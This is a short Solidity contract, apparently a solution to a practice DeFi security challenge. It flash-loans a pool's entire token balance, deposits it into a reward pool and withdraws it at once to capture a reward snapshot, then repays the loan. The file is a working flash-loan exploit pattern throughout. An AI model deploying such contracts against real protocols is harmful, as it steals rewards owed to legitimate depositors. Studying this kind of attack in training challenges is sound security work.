// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";


contract HackRewarder {

    IERC20 token;
    FlashLoanerPool pool;
    TheRewarderPool rewardPool;
    uint256 andhapaisa;

    constructor (address _pool, address _token, address _rewardPool) {
        
        pool = FlashLoanerPool(_pool);
        token = IERC20(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        andhapaisa = token.balanceOf(address(pool));
    }

    function attack() public {
        pool.flashLoan(andhapaisa);
    }

    fallback() external {

        token.approve(address(rewardPool), andhapaisa);
        rewardPool.deposit(andhapaisa);
        rewardPool.withdraw(andhapaisa);
        token.transfer(address(pool),andhapaisa);
    }
}